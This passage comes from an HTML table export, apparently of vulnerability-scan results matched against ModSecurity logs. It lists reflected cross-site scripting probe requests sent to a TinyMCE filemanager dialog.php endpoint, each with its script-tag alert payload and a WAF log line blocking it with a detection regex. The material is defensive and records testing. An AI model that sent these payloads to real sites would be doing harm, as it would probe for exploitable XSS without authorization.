</td><td class=xl24 width=64 >2015-04-01 09:17:14</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:13 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(447799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqQawQAW0AAD9ieagAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqQawQAW0AAD9ieagAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358377</td><td class=xl24 width=64 >2015-03-31 01:03:31</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(905799)&lt;/script&gt;&lt;!--&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28905799%29%2F; PHPSESSID=jjci5gfble6dv5oqu4fropujs0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:15</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:14 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(905799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqQqwQAW0AABu6pLIAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqQqwQAW0AABu6pLIAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358378</td><td class=xl24 width=64 >2015-03-31 01:07:47</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >5519719cba727</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=&quot;&gt;&lt;script&gt;alert(396099)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=p4ujaeo5tgjh1gt8ego8kop5e6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:17</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:15 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:5519719cba727. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(396099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqQ6wQAW0AABrOWbIAAAAJ&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqQ6wQAW0AABrOWbIAAAAJ</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358379</td><td class=xl24 width=64 >2015-03-31 01:09:19</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(199299)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=fvd837mcsp5pl7tnsjtpro9rs2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:18</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:17 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(199299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqRawQAW0AAD9hYF8AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqRawQAW0AAD9hYF8AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358380</td><td class=xl24 width=64 >2015-03-31 01:12:44</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&lt;script&gt;prompt(151299)&lt;/script/&gt;&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=pk3q15998b2bv88640rhhpver6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:19</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:18 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(151299)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqRqwQAW0AABvT9-AAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqRqwQAW0AABvT9-AAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358381</td><td class=xl24 width=64 >2015-03-31 01:14:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(482399)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=0iqgektcss3p2ml7lsi3hecmn7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:20</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:19 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(482399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqR6wQAW0AABqr3CcAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqR6wQAW0AABqr3CcAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358382</td><td class=xl24 width=64 >2015-03-31 01:16:49</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c07593</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(836299)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c07593=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=eursf5s8e57vmo04jrmjntgrm0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:22</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:20 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(836299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqSKwQAW0AABrkSY4AAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqSKwQAW0AABrkSY4AAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358383</td><td class=xl24 width=64 >2015-03-31 01:17:54</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(417699)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=oj0qamr6q5sl0eav8cdfn6c1p1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:23</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:22 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(417699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqSqwQAW0AABtTHQ8AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqSqwQAW0AABtTHQ8AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358384</td><td class=xl24 width=64 >2015-03-31 01:20:14</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
